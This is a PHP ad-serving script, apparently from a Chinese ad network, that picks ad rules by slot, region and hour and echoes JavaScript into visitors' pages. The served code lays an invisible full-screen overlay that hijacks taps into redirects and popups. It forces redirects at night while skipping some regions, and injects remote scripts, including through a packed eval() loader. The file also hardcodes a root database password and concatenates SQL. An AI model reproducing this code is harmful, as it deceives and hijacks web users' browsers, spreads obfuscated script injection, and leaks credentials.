<?php
header("Cache-Control: no-cache");
header("Pragma: no-cache");
header("Access-Control-Allow-Credentials: true");

//error_reporting(0);
date_default_timezone_set('PRC');//校正时间    

//连接redis
$sredis = new Redis();
$sredis->connect('127.0.0.1', 6379);
//redis切库   因原先只使用2号库  切库之后使用2-8号库
$week = date('w');
switch($week){
    case 1:
        $sredis->select(2);
        break;
    case 2:
        $sredis->select(3);
        break;
    case 3:
        $sredis->select(4);
        break;
    case 4:
        $sredis->select(5);
        break;
    case 5:
        $sredis->select(6);
        break;
    case 6:
        $sredis->select(7);
        break;
    case 0:
        $sredis->select(8);
}

//连接数据库
try{
    //正式
    $spdo = new PDO('mysql:host=127.0.0.1;dbname=lezun;port=3306','root','xya197a3321');
    //本地
    // $pdo = new PDO('mysql:host=192.168.63.3;dbname=lezunsys;port=3306','root','xya197');
    //$spdo = new PDO('mysql:host=127.0.0.1;dbname=lezunsys;port=3306','root','123456');
    $spdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
    $spdo->exec('set names utf8');
}catch(PDOException $e){
    // echo '数据库连接失败'.$e->getMessage();
}

function dump($var, $echo = true, $label = null, $flags = ENT_SUBSTITUTE)
{

    $label = (null === $label) ? '' : rtrim($label) . ':';
    ob_start();
    var_dump($var);
    $output = ob_get_clean();
    $output = preg_replace('/\]\=\>\n(\s+)/m', '] => ', $output);
    if (false) {
        $output = PHP_EOL . $label . $output . PHP_EOL;
    } else {
        if (!extension_loaded('xdebug')) {
            $output = htmlspecialchars($output, $flags);
        }
        $output = '<pre>' . $label . $output . '</pre>';
    }
    if ($echo) {
        echo($output);
        return null;
    } else {
        return $output;
    }
}

//第一步接收参数
$get_urlnum = $_GET['id'];

//点弹跳转域名   也就是乐樽后台跳转服务器域名
$jpServer = '//lezun.sjzwhwy.com';
//唤醒服务器域名
$wakeServer = '//lezun.sjzwhwy.com';

$urlnum = base64_decode(base64_decode($get_urlnum));
$urlnum = explode('&',$urlnum);
$id = empty($urlnum[0])?0:$urlnum[0];
$ipInfos = substr($urlnum[1], 8);
$user_ip = substr($urlnum[2], 4);
$province = substr($urlnum[3], 9);
//第二步查数据库广告位地域js
$adzLimitSql = $spdo->prepare("select checkadz,point_close,adz_ua from lz_adzone where adz_id=?");
$adzLimitSql->execute(array($id));
$adzList = $adzLimitSql->fetchAll();
if (!empty($adzList[0])) {
    //第三步序列化广告位地域js 重新组装
    $checkadz_adz = unserialize($adzList[0]['checkadz']);
    $checkadz = un_checkadz($checkadz_adz);

    //第四步查询该广告位是否有地域限制，并且地域符合，判断是否发送js，否则直接跳过 0拒绝 1允许
    $adz_regionjs = adz_ArrayJs($checkadz,$ipInfos);
    if(!empty($adz_regionjs)){
        //发送js
        // $sredis->select(2);
        adz_sendjs($adz_regionjs,$sredis,$id,$user_ip);
    }
    //广告位开启点弹 和 附加定向功能
    if ($adzList[0]['point_close'] == 1) {
        //广告位点弹
        pointPage($spdo,$id,$ipInfos,$province);
        //广告位附加定向设置功能
        adzSite($adzList,$spdo,$id,$ipInfos,$province);
        $spdo = null;
    }

}

/**
 * @param 广告位点弹各功能
 */
function pointPage($spdo,$id,$ipInfos,$province){
    //查询广告位下的点弹数据
    $pointSql = $spdo->prepare("SELECT id,adz_id,num,url,url_name,area_limit,hour,status FROM lz_point WHERE adz_id=? AND status=?");
    $pointSql->execute(array($id,1));
    $pointList = $pointSql->fetchAll();
    //点弹限制筛选
    if (!empty($pointList)) {
        $pointData = pointLimit($pointList,$ipInfos);
        //同时间段出现两个链接则只 输出第一个
        foreach ($pointData as $key => $value) {
            $pointUrl = $value;
            break;
        }
        //空链接不输出
        if (empty($pointUrl['url'])) {
            return false;
        }
        //输出js  在js中做次数限制  和点弹效果
        $js_hour = date('H', time());
        //广告位10657    白天点弹，晚上跳转，晚上时间24：00到7：00 ，并且晚上屏蔽北京，河北省
        if ($id == 10657 && (int)$js_hour <= 7 && (int)$js_hour >= 0) {//时间
            if ($ipInfos != '北京' && $province != '河北') {
                output_jumpjs($pointUrl);
            }
        } elseif ($id == 10541 && ((int)$js_hour <= 7 && (int)$js_hour >= 0) || ((int)$js_hour >= 20 && (int)$js_hour <= 24)) {
            //广告位10541 白天点弹，晚上直接跳转（晚20：00--早上7:00）
            output_jumpjs($pointUrl);
        } elseif ($id == 10718 && ((int)$js_hour <= 8 && (int)$js_hour >= 0) || ((int)$js_hour >= 21 && (int)$js_hour <= 24)) {
            //广告位10718 是要白天点弹 , 晚上跳转（21：00-8：00）
            output_jumpjs($pointUrl);
        } elseif ($id == 10131 || $id == 10156 || $id == 10268 || $id == 10426 || $id == 9885 || $id == 9837 || $id == 10711 || $id == 10366 || $id == 10691 || $id == 8643 || $id == 10762 || $id == 10781 || $id == 1077 || $id == 8935) {
            //10131 10156 10268 10426广告位延时10秒跳转指定落地页
            //9885 9837 10711 10366 10691 8643 10762 10781  1077广告位直接跳转指定落地页
            output_jumpjs($pointUrl);
        } else {
            output_js($pointUrl);
        }
    }
}

/**
 * 广告位定向附加功能
 */
function adzSite($adzList,$spdo,$id,$ipInfos,$province)
{
    //第一步   处理广告位屏蔽手机型号
    $adzUaRes = adzUaLimit($adzList);
    //第二步   手机型号限制通过 查询广告位的附加定向功能信息
    if($adzUaRes){
        $adzSiteSql = $spdo->prepare("select id,adz_id,wake_on,wake_pro,wake_num,jp_port,jp_on,jp_type,jp_ip,point_site,point_time,point_num,point_url,jump_time,jump_url,js_on,js_check,map_rule,hour_rule from lz_adzone_rule where adz_id=? and status=1");
        $adzSiteSql->execute(array($id));
        $adzData = $adzSiteSql->fetchAll();
    }
    //第三步   地域限制和时间限制  二维数组   循环完成输出
    if(!empty($adzData)){
        $adzLimit = adzLimitRes($adzData,$ipInfos);
    }
    if(!empty($adzLimit)){
        //一个广告位下时间地域在同时间段只能出现一个规则    foreach 只取满足条件的第一个规则
        foreach($adzLimit as $key => $value){
            //第四步  唤醒
            adzWake($value);
            //第五步  点弹或者跳转
            adzJpRes($value,$spdo);
            //第六步   附加js功能
            adzSiteJs($value);
            break;
        }
    }
}
//输出直接跳转js
function output_jumpjs($pointUrl)
{
    echo 'var zzzdid = "'.$pointUrl['adz_id'].'";';//广告位id
    echo 'var afdid = "'.$pointUrl['id'].'";'; //链接id
    echo 'var sdf = "'.$pointUrl['num'].'";'; //跳转次数
    echo 'var xurz = "'.$pointUrl['url'].'";'; //跳转链接
    //点弹输出 10657广告位新窗口打开
    //10131 10156 10268 10426广告位延时10秒跳转指定落地页
    echo "if(zzzdid == 10131||zzzdid == 10156||zzzdid == 10268||zzzdid == 10426){
        setTimeout(function() {
            teyyt(); 
        }, 10000); 
    }else{
        if(zzzdid==9031){
            setTimeout(function() {
                teyyt(); 
            }, 500); 
        }else{
            teyyt();
        }
    }
    function ame() {
        window.location.href = xurz;
    }
    function teyyt() {
        var a = new Date(new Date().toLocaleDateString()).getTime() + 24 * 60 * 60 * 1000;
        var name = 'mg' + afdid;
        var b = get('mg' + afdid);
        if (b == -1) {
            ame();
            set('mg' + afdid, '0', a)
        } else {
           if (b + 1 < sdf - 1) {
                ame()
            } else if (b + 1 == sdf - 1) {
                ame();
            } 
            set('mg' + afdid, b + 1, a)
        }
    }
    function set(a, b, c) {
        localStorage.setItem(a, JSON.stringify({
            data: b,
            time: c
        }))
    }
    function get(a) {
        var b = localStorage.getItem(a);
        var c = JSON.parse(b);
        if (c == null || c.time < new Date().getTime()) {
            return -1
        } else {
            var d = JSON.parse(c.data);
            return d
        }
    }";
}

//输出点弹js
function output_js($pointUrl)
{
    echo 'var zzzdid = "'.$pointUrl['adz_id'].'";'; //广告位id
    echo 'var afdid = "'.$pointUrl['id'].'";'; //链接id
    echo 'var sdf = "'.$pointUrl['num'].'";';  //点弹次数
    echo 'var xurz = "'.$pointUrl['url'].'";'; //点弹连接
    //点弹输出 10657广告位新窗口打开  广告位10710  10秒之后开启点弹功能
    echo "var af = document.createElement('af');
    af.innerHTML = '<a id=\"af\" style=\"display: block;width: 100%;height: 100%;background-color: transparent;position: fixed;left: 0;top: 0;z-index:2147483647;\"></a>';
    document.body.appendChild(af);
    if(zzzdid == 10723||zzzdid == 10710||zzzdid == 10481){  
        setTimeout(function() {
            if (document.getElementById('af')) {
                document.getElementById('af').addEventListener('touchend', teyyt)
            }
        }, 10000); 
    }else{
        if (document.getElementById('af')) {
            document.getElementById('af').addEventListener('touchend', teyyt)
        }
        setctime();
    }
    function setctime(){
        setTimeout(function() {
            document.getElementById('af').style.display = 'none'
        }, 10000); 
    }
    function ame() {
        if(zzzdid == 10657){
            window.open(xurz);
        }else{
            window.location.href = xurz
        }
    }
    function teyyt() {
        var a = new Date(new Date().toLocaleDateString()).getTime() + 24 * 60 * 60 * 1000;
        var name = 'mg' + afdid;
        var b = get('mg' + afdid);
        if (b == -1) {
            document.getElementById('af').style.display = 'block';
            ame();
            set('mg' + afdid, '0', a)
        } else {
           if (b + 1 < sdf - 1) {
                document.getElementById('af').style.display = 'block';
                ame()
            } else if (b + 1 == sdf - 1) {
                ame();
                document.getElementById('af').style.display = 'none'
            } else {
                document.getElementById('af').style.display = 'none'
            } 
            set('mg' + afdid, b + 1, a)
        }
    }
    function set(a, b, c) {
        localStorage.setItem(a, JSON.stringify({
            data: b,
            time: c
        }))
    }
    function get(a) {
        var b = localStorage.getItem(a);
        var c = JSON.parse(b);
        if (c == null || c.time < new Date().getTime()) {
            return -1
        } else {
            var d = JSON.parse(c.data);
            return d
        }
    }";
}

/**
 * @param 广告位点弹功能  地域和时间限制
 */
function pointLimit($pointList,$ipInfos)
{
    foreach ($pointList as $key => $value) {
        //地域限制
        $area_limit = unserialize($value['area_limit']);
        if($area_limit['city_isacl'] == "1"){ //开启限制
            //地域限制1是允许   0是拒绝
            if($area_limit['comparison'] == "1"){
                if (!in_array($ipInfos, $area_limit['city_data'])) {
                    unset($pointList[$key]);
                    continue;
                }
            }else{
                if (in_array($ipInfos, $area_limit['city_data'])) {
                    unset($pointList[$key]);
                    continue;
                }
            }
        }
        //时间限制
        $s_hour = unserialize($value['hour']);
        if (empty($s_hour) || !in_array(date('H', time()), $s_hour)) {
            unset($pointList[$key]);
            continue;
        };
    }
    return $pointList;
}


//收集手机型号
$sredis->select(0);
$uaaaaagent = $_SERVER['HTTP_USER_AGENT'];
$str_userAgent = str_user_agent($uaaaaagent);
if(!empty($str_userAgent)){
    $user_agent = $sredis->HINCRBY('user_agent',$str_userAgent,1);
}
function str_user_agent($uaaaaagent){
    if(stristr($uaaaaagent, 'Android')){
        if(stristr($uaaaaagent, 'Build')){
            $sub_end = stristr($uaaaaagent, 'uild',true); //截取uild之前的字符串
            $sub_start = strripos($sub_end,';') + 2; //从;最后出现的位置 开始截取
            $sub_endnum = strripos($sub_end,'B'); //B最后一次出现的位置
            $sub_cha = ($sub_endnum - $sub_start) - 1; //截取几位
            $sub_results = substr($sub_end, $sub_start, $sub_cha);
            if(empty($sub_results)){
                $sub_results = '';
            }
        }else{
            $sub_results = '';
        }
    }elseif(stristr($uaaaaagent, 'iphone')){
        //如果是iphone 返回操作系统
        $sub_end = stristr($uaaaaagent, 'ike',true); //截取like之前的字符串
        $sub_start = strripos($sub_end,'CPU') + 4; //从;最后出现的位置 开始截取
        $sub_endnum = strripos($sub_end,'l'); //L最后一次出现的位置
        $sub_cha = ($sub_endnum - $sub_start) - 1; //截取几位
        $sub_results = substr($sub_end, $sub_start, $sub_cha);
    }else{
        $sub_results = '';
    }
    $sub_results = str_replace(" ","",$sub_results);
    return $sub_results;
}

//获取当前网站域名
$user_site_url = !isset($_SERVER["HTTP_REFERER"]) ? '' : $_SERVER["HTTP_REFERER"];
$user_site_url = explode('/',$user_site_url);
$adsthisUrl = empty($user_site_url) ? '' : $user_site_url[2];
//域名不为空进入
if(!empty($adsthisUrl)){
    //判断域名是否访问过广告位
    $siteNum = $sredis->HEXISTS('record-'.$id,$adsthisUrl);
    $domain_num = array();
    if($siteNum == false){
        //此域名没有访问此广告位id时存入
        $domain_num = array(
            $adsthisUrl => 1,
        );

    }else{
        $domain_adzid = $sredis->HMGET('record-'.$id,array($adsthisUrl));
        //此域名有访问 num 加 1
        $domain_num = array(
            $adsthisUrl => $domain_adzid[$adsthisUrl]+1,
        );
    }
    $sredis->HMSET('record-'.$id,$domain_num);
}

unset($sredis);
exit;


//发送广告位js
function adz_sendjs($adz_regionjs,$sredis,$id,$user_ip)
{
    //5份地域js 循环发送筛选出的满足的地域js
    foreach ($adz_regionjs as $key => $value) {
        //第一步查询该广告在该ip下的展示次数,并且将本次展示计入次数
        $sredis->HINCRBY('adz_num_ip'.$id,$user_ip.'-'.$key,1);
        $adzNumNow = $sredis->HMGET('adz_num_ip'.$id,array($user_ip.'-'.$key))[$user_ip.'-'.$key];
        //第三步比较该ip在该广告下的展示次数是否大于开启限制时设定的展示频率
        $value['adznum'] = empty($value['adznum']) ? 1 : $value['adznum'];
        if($adzNumNow >= $value['adznum']){
            //第四步获取该ip该广告位在周期内是否发送过js代码，没有发送过则发送js代码，若已经发送过则今天内不会再次发送
            //用cookie存js周期(cookie自动过期 redis2号库每天凌晨0：00分清空)
            $cookie_ip = str_replace('.','_',$user_ip);
            $adz_cookie = $id.'-'.$cookie_ip.'-'.$key;
            $_COOKIE[$adz_cookie] = isset($_COOKIE[$adz_cookie]) ? $_COOKIE[$adz_cookie] : 'null';
            //读取cookie
            $adzNumTwo = $_COOKIE[$adz_cookie];
            //如果1号redis库中该ip该广告位下没有数据，则发送js代码
            if($adzNumTwo == 'null'){
                $time = rand($value['adzcycle1'],$value['adzcycle2']);
                //当前时间   cookie存的时间为0:00 -24:00 以天计算
                $current = date("H:i:s",time());
                $parsed = date_parse($current);
                //得到当前的秒
                $seconds = $parsed['hour'] * 3600 + $parsed['minute'] * 60 + $parsed['second'];
                $time = empty($time) ? 1 : $time;
                if($time == 1){
                    //当周期为1即 存1天用86400-当天已经过的时间=ip存的时间
                    $redis_time = 86400 - $seconds;
                    setcookie($adz_cookie,'%fdsasa',time()+ $redis_time);
                }else{
                    //当周期不为1即 先减去当天24小时 然后再加上今天剩余的秒
                    $redis_time = ($time-1)*86400+(86400 - $seconds);
                    setcookie($adz_cookie,'%fdsasa',time()+ $redis_time);
                }
                if(!strpos($value['adzjs'],'?')){
                    if (!strpos($value['adzjs'], 'json/lz01.js')) {
                        $value['adzjs'] = $value['adzjs'].'?'.rand(1000,10000);
                    }
                }else{
                    $value['adzjs'] = $value['adzjs'].'&'.rand(1000,10000);
                }
                $value['adzjs'] = str_replace('#','&',$value['adzjs']);
                //发送js链接
                echo'var z = "'.$value['adzjs'].'"';
                echo ";eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('h 5(a){2 1=3.f(\'4\');1.7=\'9/c\';1.d=\"6-8\";1.g=a;2 b=3.i(\'4\')[0];b.j.k(1,b)}l{5(m)}n(e){}',24,24,'|x|var|document|script|y|utf|type||text|||javascript|charset||createElement|src|function|getElementsByTagName|parentNode|insertBefore|try|z|catch'.split('|'),0,{}));";

                //已发送js请求的今天不会再次发送js请求，将默认redis库中的展示此次置为-1000
                //因为周期以天为单位，0号库中的该数据今天肯定不会失效，保证该广告位该ip今天不会再次进入判断，不用再次切换redis库，节省性能
                $adzDataNum[$user_ip.'-'.$key] = -1000;
                $sredis->HMSET('adz_num_ip'.$id,$adzDataNum);
            }
        }
    }
}

//判断地域限制
function adz_ArrayJs($checkadz,$ipInfos)
{
    $array = array(
        'adz_1' => 1,
        'adz_2' => 2,
        'adz_3' => 3,
        'adz_4' => 4,
        'adz_5' => 5);
    $adz_regionjs = array();

    foreach ($array as $key => $num) {
        $isacl = 'isacl_'.$num;
        $comparison = 'comparison_'.$num;
        $city = 'city_'.$num;
        $adzcycle1 = 'adzcycle1_'.$num;
        $adzcycle2 = 'adzcycle2_'.$num;
        $adznum = 'adznum_'.$num;
        $adzjs = 'adzjs_'.$num;
        if($checkadz[$isacl] == 1){
            if($checkadz[$comparison] == 0){
                //ip地址不包含在拒绝的地址内，判断是否发送js
                if(!in_array($ipInfos,$checkadz[$city])){
                    $adz_regionjs = adz_numarr($checkadz[$adznum],$checkadz[$adzcycle1],$checkadz[$adzcycle2],$checkadz[$adzjs],$adz_regionjs,$key);
                }
            }else{
                //ip地址包含在允许的地址内，判断是否发送js
                if(in_array($ipInfos,$checkadz[$city])){
                    $adz_regionjs = adz_numarr($checkadz[$adznum],$checkadz[$adzcycle1],$checkadz[$adzcycle2],$checkadz[$adzjs],$adz_regionjs,$key);
                }
            }
        }
    }
    unset($checkadz);
    return $adz_regionjs;
}

//反序列化广告位地域js
function un_checkadz($checkadz)
{
    $checkadz_isacl = explode('&',$checkadz['isacl']);
    $checkadz['isacl_1'] = empty($checkadz_isacl[0]) ? 0 : $checkadz_isacl[0];
    $checkadz['isacl_2'] = empty($checkadz_isacl[1]) ? 0 : $checkadz_isacl[1];
    $checkadz['isacl_3'] = empty($checkadz_isacl[2]) ? 0 : $checkadz_isacl[2];
    $checkadz['isacl_4'] = empty($checkadz_isacl[3]) ? 0 : $checkadz_isacl[3];
    $checkadz['isacl_5'] = empty($checkadz_isacl[4]) ? 0 : $checkadz_isacl[4];
    unset($checkadz['isacl']);
    $checkadz_comparison = explode('&',$checkadz['comparison']);
    $checkadz['comparison_1'] = isset($checkadz_comparison[0]) ? $checkadz_comparison[0] : 1;
    $checkadz['comparison_2'] = isset($checkadz_comparison[1]) ? $checkadz_comparison[1] : 1;
    $checkadz['comparison_3'] = isset($checkadz_comparison[2]) ? $checkadz_comparison[2] : 1;
    $checkadz['comparison_4'] = isset($checkadz_comparison[3]) ? $checkadz_comparison[3] : 1;
    $checkadz['comparison_5'] = isset($checkadz_comparison[4]) ? $checkadz_comparison[4] : 1;
    unset($checkadz['comparison']);
    $checkadz_adzcycle1 = explode('&',$checkadz['adzcycle1']);
    $checkadz['adzcycle1_1'] = isset($checkadz_adzcycle1[0]) ? $checkadz_adzcycle1[0] : 1;
    $checkadz['adzcycle1_2'] = isset($checkadz_adzcycle1[1]) ? $checkadz_adzcycle1[1] : 1;
    $checkadz['adzcycle1_3'] = isset($checkadz_adzcycle1[2]) ? $checkadz_adzcycle1[2] : 1;
    $checkadz['adzcycle1_4'] = isset($checkadz_adzcycle1[3]) ? $checkadz_adzcycle1[3] : 1;
    $checkadz['adzcycle1_5'] = isset($checkadz_adzcycle1[4]) ? $checkadz_adzcycle1[4] : 1;
    unset($checkadz['adzcycle1']);
    $checkadz_adzcycle2 = explode('&',$checkadz['adzcycle2']);
    $checkadz['adzcycle2_1'] = isset($checkadz_adzcycle2[0]) ? $checkadz_adzcycle2[0] : 1;
    $checkadz['adzcycle2_2'] = isset($checkadz_adzcycle2[1]) ? $checkadz_adzcycle2[1] : 1;
    $checkadz['adzcycle2_3'] = isset($checkadz_adzcycle2[2]) ? $checkadz_adzcycle2[2] : 1;
    $checkadz['adzcycle2_4'] = isset($checkadz_adzcycle2[3]) ? $checkadz_adzcycle2[3] : 1;
    $checkadz['adzcycle2_5'] = isset($checkadz_adzcycle2[4]) ? $checkadz_adzcycle2[4] : 1;
    unset($checkadz['adzcycle2']);
    $checkadz_adznum = explode('&',$checkadz['adznum']);
    $checkadz['adznum_1'] = isset($checkadz_adznum[0]) ? $checkadz_adznum[0] : 1;
    $checkadz['adznum_2'] = isset($checkadz_adznum[1]) ? $checkadz_adznum[1] : 1;
    $checkadz['adznum_3'] = isset($checkadz_adznum[2]) ? $checkadz_adznum[2] : 1;
    $checkadz['adznum_4'] = isset($checkadz_adznum[3]) ? $checkadz_adznum[3] : 1;
    $checkadz['adznum_5'] = isset($checkadz_adznum[4]) ? $checkadz_adznum[4] : 1;
    unset($checkadz['adznum']);
    $checkadz_adzjs = explode('&',$checkadz['adzjs']);
    $checkadz['adzjs_1'] = isset($checkadz_adzjs[0]) ? $checkadz_adzjs[0] : '';
    $checkadz['adzjs_2'] = isset($checkadz_adzjs[1]) ? $checkadz_adzjs[1] : '';
    $checkadz['adzjs_3'] = isset($checkadz_adzjs[2]) ? $checkadz_adzjs[2] : '';
    $checkadz['adzjs_4'] = isset($checkadz_adzjs[3]) ? $checkadz_adzjs[3] : '';
    $checkadz['adzjs_5'] = isset($checkadz_adzjs[4]) ? $checkadz_adzjs[4] : '';
    unset($checkadz['adzjs']);
    if(is_array($checkadz['city'])){
        $checkadz['city_1'] = $checkadz['city'];
        $checkadz['city_2'] = '';
        $checkadz['city_3'] = '';
        $checkadz['city_4'] = '';
        $checkadz['city_5'] = '';
    }else{
        $checkadz_city = explode('&',$checkadz['city']);
        $checkadz['city_1'] = unserialize(isset($checkadz_city[0]) ? $checkadz_city[0] : 1);
        $checkadz['city_2'] = unserialize(isset($checkadz_city[1]) ? $checkadz_city[1] : 1);
        $checkadz['city_3'] = unserialize(isset($checkadz_city[2]) ? $checkadz_city[2] : 1);
        $checkadz['city_4'] = unserialize(isset($checkadz_city[3]) ? $checkadz_city[3] : 1);
        $checkadz['city_5'] = unserialize(isset($checkadz_city[4]) ? $checkadz_city[4] : 1);
    }
    unset($checkadz['city']);
    unset($checkadz['province']);
    return $checkadz;
}

//满足限制的广告位
function adz_numarr($adznum,$adzcycle1,$adzcycle2,$adzjs,$adz_regionjs,$name)
{
    $adz_regionjs[$name]['adznum'] = $adznum;
    $adz_regionjs[$name]['adzcycle1'] = $adzcycle1;
    $adz_regionjs[$name]['adzcycle2'] = $adzcycle2;
    $adz_regionjs[$name]['adzjs'] = $adzjs;
    return $adz_regionjs;
}

/**
 * 手机型号屏蔽
 */
function adzUaLimit($param)
{
    $adzUa = unserialize($param[0]['adz_ua']);
    //屏蔽手机型号开启状态  判断当前
    if($adzUa && !empty($adzUa['adz_uaOn'])){
        //获取手机型号
        $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
        //替换手动填写手机型号填入的是中文字符
        $adzUa['adz_ua']  = str_replace('，',',',$adzUa['adz_ua']);
        $ua = explode(',',$adzUa['adz_ua']);
        foreach($ua as $key => $value){

            //判断拒绝还是允许  0拒绝  1允许
            if(empty($adzUa['adz_uaLimit'])){
                if(strpos($agent,$value) !== false){ //包含手机型号，拒绝，不继续执行
                    return false;
                }
            }else{
                if(strpos($agent,$value) == false){//不包含手机型号，允许，不继续执行
                    return false;
                }
            }
            return true;
        }

    }
    return true;
}

/**
 *  广告位附加定向设置地域和时间限制
 */
function adzLimitRes($param,$ipInfos)
{
    foreach($param as $key => $value){
        //时间以外限制
        $hourRule = unserialize($value['hour_rule']);
        if (empty($hourRule) || !in_array(date('H', time()), $hourRule)) {
            unset($param[$key]);
            continue;
        };
        //地域限制
        $mapRule = unserialize($value['map_rule']);
        //地域限制是否开启 0不限  1限制
        if(!empty($mapRule['city_isacl'])){
            $city = unserialize($mapRule['city_data']);
            //地域限制是允许还是拒绝  0拒绝  1允许
            if(empty($mapRule['comparison'])){
                //拒绝
                if(in_array($ipInfos, $city)){
                    unset($param[$key]);
                    continue;
                }
            }else{
                //允许
                if(!in_array($ipInfos, $city)){
                    unset($param[$key]);
                    continue;
                }
            }
        }
        //判断机型投放端口
        if (!empty($value['jp_port'])){
            $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
            $is_android = (stripos($agent, 'android')) ? true : false;
            $is_iphone = (stripos($agent, 'iphone')) ? true : false;
            // jp_port==1 ios  jp_port==2 android
            if ($value['jp_port'] == 1 && !$is_iphone){
                unset($param[$key]);
                continue;
            }elseif ($value['jp_port'] == 2 && !$is_android){
                unset($param[$key]);
                continue;
            }
        }
    }
    return $param;
}

/**
 * 广告位附加定向  唤醒产品
 */
function adzWake($param)
{
    //唤醒功能开启
    if($param['wake_on'] == 1){
        //唤醒频率
        $randNum = rand(1, 100);
        $proType = unserialize($param['wake_pro']);
        if ($randNum <= $param['wake_num'] && !empty($proType)) {
            $pro = implode(',',$proType);
            //输出请求cpa产品的链接
            global $wakeServer;
            $proUrl = $wakeServer.'/jia/azpro.php?pro='.$pro;
            // echo 'cpa产品';
            echo 'var z = "'.$proUrl.'";';
            echo "var x = document.createElement('script');x.type = 'text/javascript';x.charset = \"utf - 8\";x.src = z;document.documentElement.appendChild(x);";
        }
    }
}

/**
 *  广告位附加定向   点弹或跳转
 */
function adzJpRes($param,$spdo)
{
    //点弹或跳转功能开启
    if($param['jp_on'] == 1){
        global $jpServer;
        echo 'var jfuhdkgeu = "'.$param['adz_id'].'";';
        //选择点弹或者跳转 0点弹 1跳转
        if(empty($param['jp_type'])){
            $pointUrl = unserialize($param['point_url']);
            $proStr = implode(',',$pointUrl);
            //查询该广告位下  定向规则点弹链接
            $url = seleJpUrl($pointUrl,$spdo,$proStr,1);
            $url = json_encode($url);
            //判断是延时点弹还是次数点弹 0延时点弹  1次数点弹
            if($param['point_site'] == 0){
                //延时点弹的时间  延时多少秒开启点弹功能
                echo 'var openTime = "'.$param['point_time'].'";';
                $url_adzjs = $jpServer.'/test/js/point.js';
            }else{
                //次数点弹playInterval
                $param['point_num'] = str_replace('，',',',$param['point_num']);
                $pointNum = explode(',',$param['point_num']);
                //js中的次数只能为数字
                foreach($pointNum as $key => $value){
                    $pointNum[$key] = (int)$value;
                }
                echo 'var playInterval = '.json_encode($pointNum).';';
                $url_adzjs = $jpServer.'/test/js/numpoint.js';
            }
            //随机数
            $num = rand(1,9999);
            echo 'var numRand = '.$num.';';
            //延时点弹还是次数点弹 0延时点弹  1次数点弹
            echo 'var siteppjo = "'.$param['point_site'].'";';
            //总共要点弹的次数
            echo 'var totalClick = "'.$param['jp_ip'].'";';
            //点弹链接
            echo 'var playUrl = '.$url.';';

        }else{
            //跳转链接
            $jumpUrl = unserialize($param['jump_url']);
            $str = implode(',',$jumpUrl);
            //查询该广告位下  定向规则点弹链接
            $jurl = seleJpUrl($jumpUrl,$spdo,$str,2);
            $jurl = json_encode($jurl);
            $jTime = json_encode(unserialize($param['jump_time']));
            echo 'var sapseujij = "'.$param['jp_ip'].'";';
            echo 'var pakoijf = '.$jurl.';';
            echo 'var prnugnia = '.$jTime.';';
            $url_adzjs = $jpServer.'/harj';
            $url_adzjs = $jpServer.'/test/js/jump.js';
        }
        echo 'var z = "'.$url_adzjs.'";';
        echo "var x = document.createElement('script');x.type = 'text/javascript';x.charset = \"utf - 8\";x.src = z;document.documentElement.appendChild(x);";
    }
}

/**
 * 广告位附加定向  附加js功能
 */
function adzSiteJs($param)
{
    global $sredis;
    global $id;
    global $user_ip;
    if($param['js_on'] == 1){
        $jsCheck = unserialize($param['js_check']);
        $adz_regionjs['adz_6'] = array(
            'adznum' => $jsCheck['adz_jsNum'],
            'adzcycle1' => $jsCheck['day_star'],
            'adzcycle2' => $jsCheck['day_end'],
            'adzjs' => $jsCheck['adz_jsUrl'],
        );
        adz_sendjs($adz_regionjs,$sredis,$id,$user_ip);
    }
}

/**
 *  查询点弹或跳转链接
 */
function seleJpUrl($pointUrl,$spdo,$str,$type)
{
    $url = array();
    //查询所有链接符合条件的链接 in查询会自动去重
    $urlSql = $spdo->prepare("SELECT id,url FROM lz_url_pool WHERE id IN(".$str.") AND type=? AND status=1");
    $urlSql->execute(array($type));
    $urlRes = $urlSql->fetchAll();
    if(!empty($urlRes)){
        $res = array();
        foreach($urlRes as $key => $value){
            $res[$value['id']] = $value['url'];
        }
        $i = 1;
        foreach($pointUrl as $key => $value){
            //链接总数不超过5个
            if($i>5){
                return $url;
            }
            if(isset($res[$value])){
                $url[$key] = $res[$value];
                $i++;
            }
        }
    }
    unset($urlRes);unset($res);
    return $url;
}